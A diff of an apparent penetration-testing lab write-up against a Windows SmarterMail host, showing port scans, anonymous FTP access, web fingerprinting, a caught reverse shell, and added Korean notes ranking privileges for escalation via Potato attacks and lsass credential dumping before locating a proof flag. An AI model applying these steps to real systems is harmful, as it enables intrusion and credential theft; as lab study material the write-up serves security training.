@@ -1,12 +1,12 @@
-# 192.168.213.65
+﻿# 192.168.192.65
 
-> nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.213.65
+> nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.192.65
 
 ![](image.png)
 ┌──(root㉿docker-desktop)-[/]
-└─# nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.213.65
+└─# nmap -p- -Pn -sC -sV --open -O -oN scan.txt 192.168.192.65
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 13:52 +0000
-Nmap scan report for 192.168.213.65
+Nmap scan report for 192.168.192.65
 Host is up (0.12s latency).
 Not shown: 47682 filtered tcp ports (no-response), 17843 closed tcp ports (reset)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -66,16 +66,16 @@ Nmap done: 1 IP address (1 host up) scanned in 265.58 seconds
 > anonymous FTP test
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nc -v 192.168.213.65 21
-192.168.213.65: inverse host lookup failed: Unknown host
-(UNKNOWN) [192.168.213.65] 21 (ftp) open
+└─# nc -v 192.168.192.65 21
+192.168.192.65: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.192.65] 21 (ftp) open
 220 Microsoft FTP Service
 
 ┌──(root㉿docker-desktop)-[/]
-└─# wget -r ftp://Anonymous:pass@192.168.213.65
---2026-10-06 14:09:42-- ftp://Anonymous:_password_@192.168.213.65/
-=> ‘192.168.213.65/.listing’
-Connecting to 192.168.213.65:21... connected.
+└─# wget -r ftp://Anonymous:pass@192.168.192.65
+--2026-10-06 14:09:42-- ftp://Anonymous:_password_@192.168.192.65/
+=> ‘192.168.192.65/.listing’
+Connecting to 192.168.192.65:21... connected.
 Logging in as Anonymous ... Logged in!
 ==> SYST ... done. ==> PWD ... done.
 ==> TYPE I ... done. ==> CWD not needed.
@@ -84,10 +84,10 @@ Logging in as Anonymous ... Logged in!
 > ftp anonymous login success
 
 ┌──(root㉿docker-desktop)-[/]
-└─# ftp 192.168.213.65
-Connected to 192.168.213.65.
+└─# ftp 192.168.192.65
+Connected to 192.168.192.65.
 220 Microsoft FTP Service
-Name (192.168.213.65:root): Anonymous
+Name (192.168.192.65:root): Anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
@@ -176,7 +176,7 @@ ftp> get 2020.05.12-administrative.log
 local: 2020.05.12-administrative.log remote: 2020.05.12-administrative.log
 229 Entering Extended Passive Mode (|||50031|)
 125 Data connection already open; Transfer starting.
-100% |**********************************************************| 504 2.98 KiB/s 00:00 ETA
+100% || 504 2.98 KiB/s 00:00 ETA
 226 Transfer complete.
 504 bytes received in 00:00 (2.98 KiB/s)
 
@@ -194,7 +194,7 @@ local: 2020.05.12-administrative.log remote: 2020.05.12-administrative.log
 
 ![](image_2.png)
 
-> http://192.168.213.65:9998/interface/root#/login
+> http://192.168.192.65:9998/interface/root#/login
 
 ![](image_5.png)
 
@@ -212,7 +212,7 @@ Shellcodes: No Results
 ![](image_1.png)
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http http://192.168.213.65:9998/interface/root#/login
+└─# http http://192.168.192.65:9998/interface/root#/login
 HTTP/1.1 200 OK
 Cache-Control: private
 Content-Encoding: gzip
@@ -224,18 +224,18 @@ Vary: Accept-Encoding
 X-AspNetMvc-Version: 5.2
 
 ┌──(root㉿docker-desktop)-[/]
-└─# curl -s http://192.168.213.65:9998/interface/login | grep -i "version\|build\|smartermail"
+└─# curl -s http://192.168.192.65:9998/interface/login | grep -i "version\|build\|smartermail"
 
 apt install whatweb
-whatweb http://192.168.213.65:9998
+whatweb http://192.168.192.65:9998
 
 ┌──(root㉿docker-desktop)-[/]
-└─# whatweb http://192.168.213.65:9998
-http://192.168.213.65:9998 [302 Found] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.213.65], Microsoft-IIS[10.0], RedirectLocation[/interface/root], Title[Object moved], UncommonHeaders[x-aspnetmvc-version]
-http://192.168.213.65:9998/interface/root [200 OK] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.213.65], Microsoft-IIS[10.0], Script, UncommonHeaders[x-aspnetmvc-version], X-UA-Compatible[IE=edge]
+└─# whatweb http://192.168.192.65:9998
+http://192.168.192.65:9998 [302 Found] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.192.65], Microsoft-IIS[10.0], RedirectLocation[/interface/root], Title[Object moved], UncommonHeaders[x-aspnetmvc-version]
+http://192.168.192.65:9998/interface/root [200 OK] ASP_NET[MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.192.65], Microsoft-IIS[10.0], Script, UncommonHeaders[x-aspnetmvc-version], X-UA-Compatible[IE=edge]
 
 apt install nikto
-nikto -h http://192.168.213.65:9998
+nikto -h http://192.168.192.65:9998
 ![](image_7.png)
 
 > Since the version is hard to find, let's just proceed in the order of most likely candidates
@@ -270,7 +270,7 @@ ConnectionRefusedError: [Errno 111] Connection refused
 
 
 - 통신 확인
-nc -vz -w 3 192.168.213.65 17001
+nc -vz -w 3 192.168.192.65 17001
 
 
 > ![](image_8.png)
@@ -312,7 +312,7 @@ SerializationVersion 1.1.0.1
 ┌──(root㉿docker-desktop)-[/]
 └─# nc -lnvp 4444
 listening on [any] 4444 ...
-connect to [192.168.45.194] from (UNKNOWN) [192.168.213.65] 49996
+connect to [192.168.45.194] from (UNKNOWN) [192.168.192.65] 49996
 ls -Filter _Flag_
 PS C:\Windows\system32> ls -Filter _FLAG_
 PS C:\Windows\system32>
@@ -362,3 +362,75 @@ SeTimeZonePrivilege Change the time zone Enabled
 SeCreateSymbolicLinkPrivilege Create symbolic links Enabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
 PS C:\Windows\system32>
+
+- 레버리지(Leverage)가 가장 높은 핵심 특권
+
+## 1. 최우선 공략 대상 특권
+
+- `SeDebugPrivilege` (Enabled)
+- 위험도: 최상
+- 활용 방법: 프로세스 메모리를 읽고 쓸 수 있으며 다른 프로세스에 디버거를 붙일 수 있습니다. 시스템(SYSTEM) 권한으로 실행 중인 프로세스(예: `lsass.exe`, `winlogon.exe`)에 접근하여 프로세스 토큰을 탈취하거나 자격 증명을 덤프(Dump)하는 데 즉시 사용합니다.
+
+- `SeImpersonatePrivilege` (Enabled)
+- 위험도: 최상
+- 활용 방법: 서비스 계정(Network Service, Local Service 등)으로 진입했을 때 가장 강력한 무기입니다. Potato 계열 취약점(Juicy Potato, Rogue Potato 등)이나 Named Pipe 기반의 가장(Impersonation) 공격을 통해 SYSTEM 권한으로 즉시 수직 권한 상승(Privilege Escalation)을 달성할 수 있습니다.
+
+- `SeTcbPrivilege` (Enabled)
+- 위험도: 최상
+- 활용 방법: 운영체제의 핵심 구성 요소처럼 동작하므로, 임의의 사용자나 프로세스의 토큰을 완전히 가장하여 사실상 시스템의 마스터 권한을 획득할 수 있습니다.
+
+---
+
+## 2. 공략 우선순위 요약
+
+1. `SeImpersonatePrivilege` 확인: 현재 계정이 일반 서비스 계정이라면 가장 먼저 Potato 계열 공격 벡터를 테스트하여 SYSTEM 권한 상승을 시도합니다.
+2. `SeDebugPrivilege` 활용: 이미 어느 정도 권한이 있거나 위 과정이 막혔을 때, 디버그 권한을 이용해 메모리에서 자격 증명을 탈취하거나 토큰을 조작합니다.
+
+## 다음 시도
+
+Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object Name -match 'flag|proof|local'
+
+┌──(root㉿docker-desktop)-[~]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.194] from (UNKNOWN) [192.168.192.65] 49694
+Get-ChildItem -Path C:\ -Recurse -Filter _flag_,_local.txt_,_proof.txt_
+PS C:\Windows\system32> Get-ChildItem -Path C:\Users _recurse -File -ErrorAction SilentlyCOntinue | Where-Object Name -match 'flag|proof|local'
+PS C:\Windows\system32>
+
+- No results found
+
+findstr /s /i "flag" C:\*.txt 2>nul
+
+- No results found
+
+Get-ChildItem -Path C:\ -Recurse -File -Include local.txt,proof.txt -ErrorAction SilentlyContinue
+
+    Directory: C:\Windows\System32\Desktop
+
+Mode LastWriteTime Length Name
+
+---
+
+-a---- 10/13/2026 10:38 PM 34 proof.txt
+
+---
+
+d-r--- 4/24/2020 3:44 AM Desktop
+
+- FLAG found
+  ![](image_13.png)
+
+Get-Content : Cannot find path 'C:\Users\Administrator\Desktop\proof.txt' because it does not exist.
+At line:1 char:1
+
+- Get-Content C:\Users\Administrator\Desktop\proof.txt 2>&1
+- ```
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\proof.txt:String) [Get-Content], ItemNot
+   FoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+  ```
+
+Get-Content C:\Windows\System32\Desktop\proof.txt
+
+FLAG
